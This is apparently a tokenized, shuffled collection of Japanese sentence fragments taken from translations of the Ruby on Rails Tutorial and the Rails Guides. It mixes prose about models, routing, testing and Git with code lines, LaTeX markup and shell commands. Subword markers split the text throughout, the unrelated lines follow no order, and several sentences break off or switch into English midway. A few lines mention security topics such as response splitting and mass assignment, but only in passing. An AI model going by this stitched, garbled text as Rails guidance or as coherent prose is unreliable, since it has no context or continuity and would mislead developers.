▁\ emph { Ruby ▁on ▁Rails チュートリアル } では 、 一 貫 した Web 開発 技 法 を学ぶ ために ▁3 ▁ つの サンプルアプリケーション を 作り ます ▟\ emph { hello } アプリ ▁(\ ref { sec : the _ hello _ application }) 、 もう少し だけ 複雑な \ emph { toy } アプリ ▁( 第 \ ref { cha : a _ toy _ app } 章 ) 、 実 践 的な \ emph { sample } アプリ ▁( 第 \ ref { cha : static _ pages } 章 から 第 \ ref { cha : following _ users } 章 まで ) ▁ です 。
▁m attr _ accessor ▁: constant _ watch _ stack
▁TIP : ▁ 平 文 テキスト の 出力 は 、 Ajax や Web サービス リクエスト に応答する ときに 最も 有用です ▟ これら では HTML 以外の 応答 を 期 待 しています 。
▁もし 要素 の順序 が 重要 である 場合は 、 配列 を使用する必要があります 。
▁これで 、 Heroku アプリ の アドレス 以外 は 図 \ ref { fig : heroku _ app } のとおり に表示される はずです 。
▁#### ▁ コミット を ス カ ッ シ ュ する
▁{0} 図 9 ▖9{/0} ▁{1} ユーザー一覧ページ に 1 00 人 の サンプルユーザー が表示されている {/1}
▁ タイトル に ERB コード を使用した Help ページのビュー
▁ アプリケーションのルート ・ ディレクトリ で 、 モデルの ジェネレータ を実行します 。
▁ これが ブラウザに 返される HTML になります 。
▁このコードは リスト \ ref { code : user _ model _ activation _ code } で使用されていました ▟ もうひとつ 、
▁ ファイル名 が 重 なら ないようにする ために 、 Rails が \ k ode { 9 3 08 b 8 f 92 fe a 4 c 19 a 3 a 0 d 8 38 5 b 4 9 45 2 6 } という 文字列 ▁( 実際の 文字列 は システム ごとに 異なります ) ▁ を追加 している ことがわかります ▟ これは 、 たとえば 画像ファイル を 新しい 画像 に 更新 したときに 、 ブラウザ 内に 保存 された キャッシュ に 意図 的に ヒ ッ ト させ ないようにする ための 仕 組み です 。
▁#### ▁stylesheet _ path
▁ ActionView :: Base ▖ sanitize d _ allow ed _ tags ▖ delete ▁' div '
▁ s ▖ add _ development _ dependency ▁" m oo "
▁has _ one ▁: account , ▁foreign _ key : ▁" s up p _ id "
▁ 現時点の リクエスト の 負 荷 によって は 、 限 られた 接続 数を 多数の スレッド が 奪 い 合 う ような こと になる かもしれません 。
▁| ▁| ▁ 302 ▁| ▁: f ound ▁|
▁これで サンプルユーザー に 、 フォローしているユーザー と フォロワー が で きました ▟ ユーザープロファイルページ と Home ページ を更新し て これを 反 映 しましょう 。
▁rake ▁db : migrate ▁S C O P E = blorgh ▁ VERSION = 0
▁{0} 図 4 ▖ 1 {/0} ▁{1} \ k ode { String } クラスの 継 承 階層 {/1}
▁File ETag ▁N one
▁belongs _ to ▁: customer , ▁-> ▁ { ▁where ▁active : ▁true ▁ },
▁* ▁ 単 一 行 ブロック は スペース 無 し の 「 ` method { do _ stuff } ` 」 よりも スペース あり の 「 ` method ▁ { ▁do _ stuff ▁}` 」 が望ましい 。
▁\ href { http :// localhost :3000/ sessions / new }{/ sessions / new } フォームを送信すると 図 \ ref { fig : initial _ failed _ login _ rails _3} のようになります 。
▁ スコープ を スコープ 内で 連 鎖 ▁( chain ) ▁ させる こともできます 。
▁ オブジェクトを 保存 しようとすると 、 関連付けられている オブジェクト ごとに ` valid ?` が呼び出され ます 。
▁ 検証 の詳細については [ Active ▁Record ▁ バリデーション ]( active _ record _ validations ▖ html ) を参照してください 。
▁@ person ▖ errors [: base ] ▁<< ▁" これは 悪 人 だ "
▁$ ▁< エディタ 名 > ▁ ▖
▁Author ▖ where ( name : ▁' H an k ▁M ood y ')▖ compact !
▁format ▖ json ▁ { ▁render ▁ json : ▁@ user ▖ errors , ▁status : ▁: un process able _ entity ▁ }
▁{0} 図 7▖2 2 {/0} {1} 本番 Web で 動作 中の ユーザー登録ページ ▟ ▁\ href { http :// railstutorial ▖ org / images / figures / signup _ in _ production _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁# ▁ 指定された 日時 ▁( ここでは 本 日 から 4 日 後 ) ▁ を デフォルト値 と する 日時 セレクト ボックス を生成する
▁ タイトル で 埋め込み Ruby を使用した Help ページのビュー
▁` prev _ week ` も同様です 。
▁assemblies << ( object , ▁ ▖▖▖)
▁たとえば 、 Supplier に アカウント が 1 つ あり 、 アカウント を含む モデルの 実際の 名前 が ` Account ` ではなく ` Billing ` になっている 場合 、 以下のように モデル名 を指定できます 。
▁images ▁ javascripts ▁stylesheets
▁` params [: id ]` には ` "1" `、` params [: user _ id ]` には ` " 2 " ` が それぞれ 保存されます 。
▁Git リポジトリを ビ ジ ュ ア ル 表示する には 、 A t la s s i an の \ href { http :// www ▖ source tree app ▖ com /}{ S our ce T re e アプリケーション } が 便利です 。
▁article ▁GET ▁ / articles / : id (▖ : format ) ▁articles # show
▁Ruby ▁on ▁Rails には 、 長 年 に 渡 って 数 百 人 もの 人 々 が 貴 重 な 貢献 を行って ください ました ▟ そ の内容は 、 わずか 1 文字 の 修正 から 、 大 規 模 な アーキテクチャ 変更 、 重要な ドキュメント 作成 まで 多 岐 に 渡 ります ▟ それらの 努 力 は 、 いずれも Ruby ▁on ▁Rails を すべての 人 々 にとって より よい もの にする ことを 目 標 に置い ています
▁ そして 解決策 が 明 確 になった 段階で 、 テスト駆動開発 で コードを 清 書 する という 方法 も あり えます 。
▁ 論 理 属性 \ k ode { admin } を追加する と 、 自動的に \ k ode { user ▖ admin ?} メソッドが 使えるように なる
▁Active ▁Support ▁ コア 拡張機能
▁# ▁< s ha 1> 723 a 4 7 b f b 37 08 f 9 6 88 2 1 b c 9 6 9 a 9 a 3 f c 87 3 a 3 ed 58 </ s ha 1>
▁リスト \ ref { code : password _ resets _ integration _ test } のコード を使用すると 、 テストコード は ▁\ passing ▁ になるはずです 。
▁ テストスイート を実行して 確 認 することもできます ▟ この テストはパスするはずです 。
▁ 今後 の 学習 の 手 始 め と するために 、 この節 では 、 より 踏 み 込 んだ 学習 を するための 方法を 紹介します 。
▁ 認 証 に 失敗した とき 、\ k ode { authenticate } の 返 り 値は \ k ode { false } になる ことを思い出してください ▟ ユーザーの サインイン 方法 の方 針 を まとめると 以下の ようになります 。
▁\ k ode { form \_ for } の 引数に 上の オプション が追加され ていることに注目してください ▟ これは ファイルを アップロード する 際に 必要となる オプション です 。
▁ この動作 は 統合テスト で 自然に 行われます ▁( リスト \ ref { code : password _ reset _ integration _ test }) ▁ が 、 この テストでは パスワード 再設定 用 トークン を 手動で 作成 する必要があります 。
▁<%= ▁f ▖ submit ▁%>
▁第 \ ref { cha : following _ users } 章では 、 そのような ユーザー 同士 の関係 ▁( リレーションシップ ) ▁ を モデリング する方法 を 学 び 、 それが マイクロポストの フィード に どのように 関連する か を 学びます 。
▁{0} 図 2 ▖8{/0}{1} 情報 が更新され た ユーザー ▟\ href { http :// railstutorial ▖ org / images / figures / demo _ update _ user _ rails _ 3- full ▖ png }{( 拡大 ) }{/1}
▁ フォロー / フォロー解除 ボタン を 動 か す ためには 、 フォーム ▁( リスト { p 0} / リスト { p 2 }) ▁ から 送信された パラメータ を使って 、 {3} followed _ id {/3} に対応する ユーザー を見つけ て く る必要があります ▁ ▟ その後 、 見つけ てきた ユーザー に対して 適切に {3} follow {/3} / {3} unfollow {/3} メソッド ▁( リスト \ ref { code : follow _ unfollow _ following }) ▁ を使います 。
▁以下の例 では 、` find _ each ` で 1 000 件 の レコード を取り出し ています ▟ この 件 数 は ` find _ each ` と ` find _ in _ batches ` のどちら でも デフォルト値 として 使用 されており 、 続いて 各 レコードを 1 つの モデル として ブロック に 個 別 に yield します 。
▁$ ▁ curl ▁- i ▁1 27 ▖ 0 ▖ 0 ▖ 1 :3000/ books
▁redirect _ to ▁action : ▁: index
▁Rails が 送信 を扱う 方法を より 深 く 理解 するために 、 デバッグ情報 のうち パラメータ ー ハッシュの \ k ode { user } の 部分を 詳 しく 見 てみましょう ▁( 図 \ ref { fig : signup _ failure _ rails _ debug }) 。
▁if ▁ expiration _ date ▖ present ?
▁params ▖ require (: comment )▖ permit (: text )
▁作成した コードをリスト \ ref { code : user _ edit _ spec s } に示します
▁{0} リスト 2▖1 3 {/0} ▁╼╼{1} \ k ode { User } クラスにおける継承 {3} {/3} ▁ { 4 } app / models / user ▖ rb {/4} {/1}
▁\ k ode { bundle ▁exec } を省略 する ことができ ました 。
▁Rails ▁ 3▖0 以前の バージョン では 、 静 的 ファイルは \ k ode { public / } 以下の 次の ディレクトリ に置かれ ていました 。
▁### ▁ 記事 を表示する
▁ / t mp
▁### ▁ 到 達 可能
▁#### ▁` instance _ value s `
▁この JavaScript コード を実行すると 、 警 告 ボックス が 1 つ 表示される だけです 。
▁この 機能 のテスト は 、 見 せ かけ の 成功 に 陥 り やすい 部分 で 、「 アプリケーション 側 の実装 が 本 当 は 間 違 っている の に テストが 成功 してしまう 」 という 罠 があります ▟ 正しい テストを書く ために 、 ここでは テスト駆動開発 で 進 め ていきます 。
▁たとえば 、 供 給 者 ( supplier ) 1 人 に つ き アカウント ( account ) を 1 つだけ 持つ という 関係 がある のであれば 、 以下のように 宣言 を行います 。
▁また 、 リスト \ ref { code : generate _ user _ model } では モデル 用の user ▖ rb も 作 ら れ ました 。
▁ 残 念 ですが 、 上のコード は Ruby の配列 の 妙 により 動きません 。
▁ サインイン に 成功 した ときの テスト 。
▁duplicate ▁# ▁=> ▁[ ' foo ']
▁ これはリスト \ ref { code : preventing _ unactivated _ login s } で使用されていました 。
▁ モデル を呼び出し た 後 、 コントローラは 、 ビューを レンダリング し 、 完成 した Web ページを HTML として ブラウザに 返します 。
▁Rails だけで しか 使 え ない 基 礎 的な 知識 に 基 づ く の ではなく 、
▁<%= ▁stylesheet _ link _ tag ▁" main ", ▁" photos / columns " ▁%>
▁$ ▁bundle ▁exec ▁rake ▁test ╼ $ ▁git ▁add ▁- A ╼ $ ▁git ▁commit ▁- m ▁" A d d ▁password ▁resets ▁& ▁email ▁configuration " ╼ $ ▁git ▁ checkout ▁master ╼ $ ▁git ▁merge ▁account - activation - password - reset
▁ W A R N : ▁` reverse _ update ` には 破壊的な バージョン はありません 。
▁ マイクロポスト 作成 のテスト 。
▁これ について もう少し 詳 しく お 知 り になり たい場合は 、\ href { http :// l m gt fy ▖ com / ? q = ruby + rails + escape + url } { 「 ruby ▁rails ▁escape ▁url 」 で 検索 してみてください } 。
▁* ▁Rails ▁4▖0 では ` ActiveModel :: Validations :: C on fi rm ation Validator ` に エラー が ア タ ッ チ される 方法 が変更され ました 。
▁この To ▁get ▁this ▁to ▁work , ▁we ▁need ▁to ▁define ▁the ▁\ k ode { password \_ reset \_ expired ?}
▁User モデル が でき あ が った ので 、 いよいよ Web サイトに なく て はならない ユーザー登録 機能 を追加しましょう 。
▁ フォーム ヘルパー を使用すると 、 標準 の HTML 要素 だけ を使用する よりも は る か に 容易に 、 モデルと 連 携 動作する フォーム を作成する ことができます 。
▁config ▖ session _ store ▁: my _ custom _ store
▁ サインイン した ユーザーは 、 も は や Users コントローラの \ k ode { new } アクション や ▁\ k ode { create } アクション にアクセス する必要はありません 。
▁master ブランチ は トピックブランチ で 行った 変更 に 影 響 されない ので 、 たとえ ブランチ 上のコード が \ emph { め ち ゃ く ち ゃ } になって しま って も 、 master ブランチ を チェック ア ウ ト して トピックブランチ を 削除 すれば 、 い つ でも 変更 を破棄する 事 が できます 。
▁ レンダリング 中の ビュー 内 に置かれている 上のコード は 、 その 場所 で ` _ menu ▖ html ▖ erb ` という名前の ファイルを レンダリング します 。
▁続いて GitHub に プッシュ しても構いません 。
▁validates ▁: registration _ number , ▁length : ▁ { ▁is : ▁6 ▁ }
▁SQL の ` NOT ` クエリ は 、` where ▖ not ` で 表 せ ます 。
▁これは 現在の レイアウト でも 、\ emph { ある 点 を除いて } 達 成 されています ▟ もし ビューの 1 つ から \ k ode { provide } 呼び出し を削除する と 、 その ページ 固有の タイトル の代わりに 以下の タイトル が表示されます 。
▁ このような ファイル パス は 、 アプリケーションのルート ディレクトリ からの 相 対 パス である と 理解 してください ▟ ルート ディレクトリ の 位 置 は システム によって 異 なり 、 この クラウド IDE ▁(\ ref { sec : development _ environment }) ▁ の場合 は以下のようになります 。
▁ ファイル サイズ を jQuery で チェック する
▁< input ▁name =" commit " ▁type =" submit " ▁value =" Create " ▁/>
▁* ▁ バリデーション プロセス で生成された エラーメッセージ の 取り 扱 い
▁ 上で 追加 した gem は 本番環境 のみ で使用する ための もの なので 、 この コマンドを 今 実行 しても gem は ローカル に 追加 されません ▟ この コマンドを実行 するのは 、 後 の 本番環境 に 備えて \ k ode { Gemfile ▖ lock } を更新し 、\ text tt { pg } ▁gem と \ text tt { rails _ 12 factor } ▁gem 、 Ruby バージョンの 指定 を含め ておく 必要がある ためです 。
▁render ▁status : ▁50 0
▁ 読者 からの フィードバック を 読 んだ 限り では 、 そのような 方 であっても 本書 から 多くの ことを 学 べ る は ず だと 自 信 を 持 って 言えます 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / strip ▖ rb ` です 。
▁< h 1> <%= ▁@ user ▖ name ▁%> 様 、 example ▖ com へ よう こ そ ▟ </ h 1>
▁( ほとんどの プログラマ ー は ネイティブ の ri や rdoc など 参 照 せず 、 さ っ さ と オンライン ドキュメント を見 に 行 ってしまいます ) 。
▁config ▖ action _ mailer ▖ default _ options ▁= ▁ { from : ▁' no - reply @ example ▖ com ' }
▁この場合 、\ k ode { params } ハッシュ では \ k ode { : user } 属性を 必 須 と し 、 名前 、 メールアドレス 、 パスワード 、 パスワード の 確 認 の 属性 をそれぞれ 許可 し 、 それ 以外 を 許可 しないよう に したい と 考え ています 。
▁Active ▁Record のバリデーション を使うと 、 モデル に対して 制限 を追加する ことができる
▁従って 、 特定の 読み込み 順 に依存し ないようにする 必要があります 。
▁=> ▁Rails ▁application ▁starting ▁on ▁ http :// 0 ▖ 0 ▖ 0 ▖ 0 : 3 000
▁Heroku 上で 動いている 最初の Rails チュートリアル アプリケーション 。
▁次に 以下のコマンドを実行し ます 。
▁< div >< input ▁type =" submit " ▁value =" A n ▁article "></ div >
▁* ▁` load _ environment _ hook `: ▁これは プレースホルダ として 使用されます ▟ 具体的には 、`: load _ environment _ config ` を定義し て この イニシャライザ より 前に 実行 したい場合 に 使用します 。
▁ 失敗する テストを 一時 的に コメントアウト する
▁デフォルトは ` false ` であり 、 この場合は Test :: Uni t が使用されます 。
▁本ガイドでは 、 バ ッ ク グ ラ ウ ンド で 実行する ジョブ の作成 や キュー 登録 ▁( エ ン キュー : ▁ enqueue ) ▁ 、 実行 方法 について解説します 。
▁g ▁the ▁text ▁`` The ▁form ▁contains ▁4 ▁errors ▖ '' ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - fa a 5 fa ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁testing _ unsuccessful _ edit s ▁( end )╼╼ ▁\ subsection { TDD で 編集 を 成功 させる } ▁% ▁( fold )╼ ▁\ label { sec : successful _ edit s }╼╼
▁It ▁work ed !
▁ただし 、 気 を つ け なく て はならない 点が 1 つ あります ▟ それ は 、 これらの 動 画 では 「 15 分 で ブログ を 作る 」 といった 離 れ 業 を 、\ emph { scaffold } ▁という 機能 を利用して 成 し 遂 げ ている 点 です ▟ このため 、 15 分 で 作 られた 機能 は 、 Rails の \ k ode { generate } コマンド によって ▁( ま る で 魔 法 のように ) ▁\ emph { 自動生成 された コード } に 強く 依 存 しています 。
▁作成した コードをリスト \ ref { code : route _ tests } に示します
▁* ▁` config ▖ middleware ` は 、 アプリケーション で使用する ミドルウェア を カスタマイズ できます 。
▁<% ▁cache ▁do ▁%>
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / in tr o spec tion ▖ rb ` 。
▁* ▁ メソッド名
▁上のコードは 常に \ k ode { nil } になってしまいます 。
▁* ▁` application _ controller ▖ rb `
▁make _ microposts
▁ コード に このような リファクタリング を 施 す と 非常に エラーが発生し や す くなる ので ▁( 訳 注 : ▁ 黒 魔 術 と呼ばれる 理由 で もあります ) 、 し っかり した テストスイート が 不可 欠 です ▟\ ref { sec : login _ with _ remember ing } や \ ref { sec : remember _ tests } で よい テストを書く ために あえて ト ラ ブ ル を 発生 させ て み た のは そう した 理由 からです 。
▁get ▁' / ' ▁=> ▁' root # index '
▁╼╼ %= ▁ lang : r html ╼\ begin { code }
▁ 既に \ ref { sec : github } で 一度 プッシュ を 行った ので 、 大 抵 の システム では \ k ode { git ▁push } を実行する ときに \ k ode { origin ▁master } を省略 できます 。
▁* ▁ モデルの クラス ▁- ▁ 単数形 であり 、 語 頭 を 大文字 にする ▁( 例 : ▁` Book Cl ub ` )
▁ただし 、 どう い う わ け か この場合 \ k ode { xhr } メソッドを 結合テスト で使用する ことができ ない ために 、 この コントローラで のテスト を 行 なっています 。
▁(\ emph { 注 } : ▁もし サンプルアプリケーションの 開発 で 必要 になる gem を \ emph { すべて } 知りたい 場合は 、 リスト \ ref { code : final _ gemfile } を参照してください ▟ これが 最終的な Gemfile になります ) 。
▁ キー は 文字列 です 。
▁config ▖ active _ job ▖ queue _ name _ prefix ▁= ▁Rails ▖ env
▁< tr >
▁( 注意 : ▁このとき に \ emph { README } ファイル を使用して リポジトリを 初期化 \ k ode { しないでください } ▁ ▟\ emph { rails ▁new } コマンドを実行 するときに これらの ファイル は自動的に 作成される からです ) ▁ 。
▁` require _ directory ` ディレクティブ を使用すると 、 指定された ディレクトリ の 直 下 にある すべての JavaScript ファイル のみ を インクルード します ▟ この場合 サブディレクトリ を 再帰的 に 探 索 しません 。
▁> > ▁Rails ▖ env
▁HTTP /1▖1 ▁200 ▁OK ▁[ ここ より 下 は 攻撃者 によって 作成された 次の 新しい レスポンス ]
▁ 同じ コントローラで 、 デフォルト と 異なる テンプレート に対応する ビューを 出力 したい場合は 、` render ` メソッドで ビュー 名 を指定することができます 。
▁ コントローラ が 受け取った パラメータを ノ ー チェック で まるごと 自動的に モデルに 渡 せる ように する 方が 確 か に 開発 は 楽 なのです が 、 パラメータ の 渡 し 方 を このように 便 利 に してしまう と 、 パラメータ が チェック されていない 点を 攻撃者 に 悪 用 される 可能性があります 。
▁ フラッシュメッセージ は Web サイトの レイアウト に表示される ▁( リスト \ ref { code : layout _ flash }) ▁ ので 、\ k ode { flash [: danger ]} で 設定 した メッセージ は自動的に 表示されます ▟ Bootstrap ▁CSS のおかげで 適切な スタイル も 与 えられ ます ▁( 図 \ ref { fig : failed _ signin _ flash }) 。
▁以下の メソッドは バリデーション を行わ ずに スキップ します ▟ オブジェクトの 保存 は 、 有効 無効 にかかわらず 行われます 。
▁ お 手 軽 すぎる Scaffold の 甘 い 誘惑
▁ 個 別の cookies は 、 ひとつ の \ k ode { value } ▁( 値 ) ▁ と 、 オプション の \ k ode { expire s } ▁( 有効期限 ) ▁ から でき ています ▟ 有効期限 は 省略 可能です 。
▁ ドキュメント ルート ・ ディレクトリ からの 完全な パス が返されます 。
▁ さ て 、 テキスト の 配置 は 今 ひとつ で 、 ロゴ には スタイル も ありません が 、 色 使い と signup ボタン は な か な か よい 感じ になって きました 。
▁ mime _ version : ▁" 1 ▖ 0 ",
▁ 複数の ファイル にアクセス したい場合 ▁( ` app / assets / javascripts / main ▖ js ` と ` app / assets / javascripts / columns ▖ js ` など ) ▁ は以下のように します 。
▁2 番目の モデル を追加する
▁create ▁db / migrate / [ timestamp ] _ create _ users ▖ rb
▁#### ▁ ミドルウェア を削除する
▁このメソッド では 、 3 つの ファクトリー ユーザー ▁( 最初の 1 人 として サインイン します ) ▁ を作成し 、 インデックス ページ に表示されている それぞれの ユーザーに リスト 要素 ▁(\ k ode { li }) ▁ タグ が与えられ ている ことを確認します 。
▁get ▁' ex it ', ▁to : ▁' sessions # destroy ', ▁as : ▁: logout
▁たとえば 、 ファイル 内の 一番 下 の サンプル データ は 最後に 生成される ので 、 最も 新しい 投 稿 になるように 修正 する 、 といった 感じ です ▟ ただ 、 この 振る舞い は 恐 ら く システム に依存し て いて 崩 れ やすい ので 、( 本 来 は ) ▁この 振る舞い に依存し た テストは 書く べ き では 無 い でしょう 。
▁リスト \ ref { code : example _ user } では 、 以下のように Ruby の \ k ode { attr _ accessor } メソッド を使用しました 。
▁\ emph { Ruby ▁on ▁Rails チュートリアル } を T V ゲ ーム に たとえ ると 、 あなた は 主 人 公 であり 、 各 章 を ク リ ア する たびに Rails 開発者 として レベル アップ して い く と 考え てください
▁\ ref { sec : format _ validation } で 説明したように 、 ▁リスト \ ref { code : validates _ format _ of _ email } の メールアドレス チェック する 正規表現 は 、 “ \ emph { foo @ bar ▖ ▖ com ” } のように ドット が 連続 した 無効な メールアドレスを 許 容 してしまいます 。
▁Git ▁( という より バージョン管理 ) ▁ は それ だけで 大きな テーマ なので 、 すべて を 説明 しようとすると 軽 く 一 冊 の 本 を 超 え てしまいます ▟ 本チュートリアル では 簡単に 言 及 する にとどめ ますが 、 幸 い ネ ッ ト 上に は 無 償 で 利用できる リソース が あ ふ れ ています ▟ その中で も 特に 、 ザ ッ ク リ と 知 る には 「\ href { https :// co nfluence ▖ at la s s i an ▖ com / display / B IT B U C K E T / Cl one + your + Git + repository + and + add + source + file s } { B it B u cket ▁10 1 } ▁( 英語 のみ )」 を 、 じ っ く り と 学ぶ には 「\ href { http :// git - s cm ▖ com / book }{\ emph { Pro ▁Git } } ▁( 日本語 � あり )」 S co tt ▁C ha con ▁( A press , ▁200 9 ) ▁ を お勧め いた します 。
▁" hello "▖ from (0) ▁# ▁=> ▁" hello "
▁#### ▁` parameterize `
▁まずは 小さな テスト から 書いていきます 。
▁もちろん 、 リスト { p 0} の {2} users {/2} テーブル 用の マイグレーション ファイルを 単 に 編集 すること も 可能な のですが 、 その 場合 ロールバック が必要 となり 、 マイグレーション が 戻 ってしまいます 。
▁`@ book ▖ special ?` が ` true ` の場合 、 Rails は レンダリング を開始 し 、 `@ book ` 変数 を ` special _ show ` ビュー に 転 送 します 。
▁ 今 の 時点 では 、 ソースコード を バージョン管理 下 に 置 か なければならない 理由 が 今 ひとつ よく わからない という 方が い る かもしれません ので 、 例を 1 つ ご 紹介します 。
▁# ▁If ▁you ▁prefer ▁to ▁use ▁m o cha , ▁f le x mock ▁or ▁R R , ▁# ▁un comment ▁the ▁appropriate ▁line :
▁create ▁app / views / microposts / edit ▖ html ▖ erb
▁As ▁mentioned ▁brief ly ▁in ▁Section ▁\ ref { sec : motivation }, ▁Rails ▁defines ▁a ▁special ▁function ▁to ▁include ▁stylesheets , ▁and
▁` to _ param ` によって 返 された 値を ▁** エスケープ して は い け ません ** ▁ ▟ 脆弱性 が生じ ます 。
▁# ▁image _ tag (" icon ▖ png ")
▁ / users /1/ edit
▁ リファクタリング
▁ どの 呼び出し を使用する か は コーディング の スタイル と 規 則 の 問題 で しか ありません が 、 経験 上 なるべく シンプルな 記 法 を使用する 方が コードが わかりやすく なる でしょう 。
▁Ruby で 単 一 の テストを実行 することができます 。
▁Rails ▁ 用 IDE として 最も 有名な のは \ href { http :// www ▖ a p t an a ▖ com / rails /}{ R ad Rails } と \ href { http :// www ▖ j e t b ra in s ▖ com / ruby / index ▖ html } { Ruby M in e } です 。
▁テストにパスする には 、 ユーザー登録ページ を 正しい HTML 要素 で 作成し 、 ページの 送信 が 正しい 場所 へ ルーティング される ように し 、 ユーザー データ が 正しい 場合にのみ 新しい ユーザーを 作成 できるように する必要があります 。
▁Rails には 、 モデルに 渡 した データ を検証する 機能 もあります 。
▁ ブロック 内の コードが 実際に 書き 込 む の はこの ファイル です 。
▁validates ▁: password , ▁length : ▁ { ▁in : ▁6 ▖ ▖ 20 ▁ }
▁De p end ent : ▁destroy
▁` bundle ▁exec ▁ spring ▁bin stub ▁-- all ` を実行して bin stub を Spring 化 する
▁### ▁ AssetTagHelper
▁ エンジン が require される ときに 依 存 gem も すぐに require したい場合は 、 以下の よう エンジン が 初期化 される より 前に require する 必要がある ことにご注意ください 。
▁上の コマンドは コントローラ を作成し ましたが 、 同様に モデル を作成する コマンド として 、\ k ode { generate ▁model } があります 。
▁ assoc ▖ has _ many ▁: invoices
▁ メールアドレス の フォーマット を検証する ためには 、 次のように \ k ode { format } という オプション を使います 。
▁そこで 最初に 、 Article の show テンプレート ▁( ` app / views / articles / show ▖ html ▖ erb ` ) ▁ を 改造 して 新規 コメント を作成 できるように しましょう 。
▁ユーザーの \ k ode { show } ページ については 、 今後 も ▁( ログイン している かどうか に 関 わ らず ) ▁ サイト を 訪 れ た すべての ユーザー から 見え るように しておきます が 、 ユーザーの \ k ode { index } ページ は ログイン した ユーザーに しか 見 せ ない ように し 、 未 登録 の ユーザーが デフォルトで 表示 できる ページを 制限 します
▁* ▁[ Rails ▁3 ▁Re m o te ▁Link s と Form s について : ▁ 決定 版 ガイド ]( http :// www ▖ al fa ja n g o ▖ com / blog / rails - 3- remote - links - and - form s / )
▁ テスト については [ Rails アプリケーション をテストする ]( testing ▖ html ) を参照してください 。
▁上の例では 、 " dear " という文字 で 切り 落 と され そう になる ところ を 、`: separator ` によって 防 い で います 。
▁このとき 、 新しい User ページ 用の 小さな テスト ▁( リスト \ ref { code : user _ new _ test }) ▁ も 生成 されて いて 、 この時点では パスするはずです 。
▁これらの ヘルパー の動作 は 完全に 同じです ▟ 事前 に 定義された カスタマイズ 可能な パス に エンジンの 機能 の一部 を マウント します 。
▁たとえば 、 上の ルーティング が 以下のように 変更 された とします 。
▁#### ▁ 変換 と 強 制
▁` BigDecimal ` オブジェクトを 文字 ではなく 数字 として エンコード する オプション
▁ここでは \ k ode { t ogg le !} メソッドを使用して ▁\ k ode { admin } 属性 の状態 を \ k ode { false } から \ k ode { true } に 反 転 しています 。
▁$ ▁bundle ▁exec ▁rake ▁test ╼ ActionView :: Missing Template : ▁ Missing ▁template ▁static _ pages / about
▁* ▁` collection ▖ build ( attributes ▁= ▁{}) `
▁( 確 認 のために 2 時間 も 待 って い ら れ ないので 、 テスト には もうひとつ 分 岐 を追加します が 、 これは \ ref { sec : activation _ resets _ exercises } の演習 に 回 す ことにします ) 。
▁ パスワードの再設定 は ▁Active ▁Record オブジェクト ではない が 、 セッション や アカウント有効化 の場合と同様 に 、 リソース で モデル 化 できる 。
▁ これら について 心 配 する必要はありません ▟)
▁デフォルトは ` ▖ html ` です 。
▁ 配列 に ` to _ query ` メソッドを 適用 した 場合 、` to _ query ` を 配列 の各 要素 に 適用 して ` _ key _ [ ]` を キー として 追加 し 、 それら を " & " で 連結 したものを 返します 。
▁ http :// www ▖ example ▖ com / users /1/ edit
▁=> ▁[" c ", ▁" g ", ▁" l ", ▁" k ", ▁" h ", ▁" z ", ▁" s ", ▁" i ", ▁" n ", ▁" d ", ▁" y ", ▁" u ", ▁" t ", ▁" j ", ▁" q ",
▁Date ▖ new (200 0, ▁1, ▁31)▖ next _ month ▁# ▁=> ▁Tue , ▁29 ▁Feb ▁2000
▁たとえば 、` / profile ` では 常に 「 現在 ログイン している ユーザー 自身 」 の プロファイル を表示し 、 他の ユーザー id を参照 する必要が ない とします 。
▁NOTE : ▁デフォルトでは 、`: plain ` オプションを使用すると 出力結果 に 現在の レイアウト が 適用 されません 。
▁` reverse _ update ` メソッドは 、 上 で説明した ` reverse _ merge !` の別名 です 。
▁次に 、 開発 中の アプリケーションに 変更を 反 映 するために 、 Web サーバーを再起動 します
▁if ▁options [: counter _ cache ] ▁== ▁true
▁ 次 で説明する ように 、 配列 を使用する の が望ましい 方法 です 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁resources ▁: d ra f t s
▁ 以下のように ` ActiveRecord :: Base ` クラスの サブクラス を作成する だけで 完了 します 。
▁<%= ▁form _ for ▁: article , ▁url : ▁article _ path (@ article ), ▁method : ▁: patch ▁do ▁| f | ▁%>
▁また 、 この fixture は {0}{1} 第 8 章 {/1}{/0} になる まで 使わない 予 定 なので 、 今 の ところ は これらの データを 削除 しておき 、 ユーザー用の fixture ファイルを 空 に しておきましょう ▁( リスト \ ref { code : empty _ fixtures }) 。
▁ユーザー \ k ode { update } アクション のテスト 。
▁ サイトの ページの カスタマイズ が 終 わ って 、 テストスイート も 軌 道 に 乗 って き たので 、 今のうちに アプリケーション ルート のルーティング を 設定 しておきましょう 。
▁\ k ode { destroy } アクション の 保 護 のテスト 。
▁図 \ ref { fig : login _ page _ protected _ mockup _ bootstrap } のように 転 送 させる 仕 組み を実装 したい ときは 、 Users コントローラ の中で \ emph { before フィルター } を使います 。
▁ アプリケーションの 名前 を変更 してみます 。
▁上の 場合 、 Rails は `@ magazine ` が ` Magazine ` であり 、 `@ ad ` が ` A d ` であること を 認 識 し 、 それ に基づいて ` magazine _ ad _ path ` ヘルパー を呼び出します 。
▁< script ▁src ="/ assets / core ▖ js ?
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api ▖ rubyonrails ▖ org / v 4▖2▖0 ▖ be t a 2 / classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を読んでみてください 。
▁\ ref { sec : a _ working _ follow _ button _ the _ standard _ way } では 、 Relationship s コントローラの \ k ode { create } アクションと ▁\ k ode { destroy } アクションを 単 に \ emph { 元の } プロファイル にリダイレクトし ていました 。
▁#### # ▁` collection ▖ empty ?
▁この 変更 内容 を 十分 理解 し 、 受 け 入 れる 準備 が でき ている のであれば 、` config / application ▖ rb ` に 以下の 記 述 を行なう ことで 非推奨 警 告 が表示され ないようにする ことができます 。
▁` many ?` メソッドは 、` collection ▖ size ▁> ▁1 ` の 短縮 形 です 。
▁上 によって 以下 が生成されます 。
▁### ▁ Delete
▁Ruby の 世界 では 、 すべて が オブジェクト である
▁$ ▁rails ▁console ▁-- sandbox
▁Gravatar は 無料 の サービス で 、 プロファイル 写 真 を アップロード して 、 指定した メールアドレス と 関連付け ることができます 。
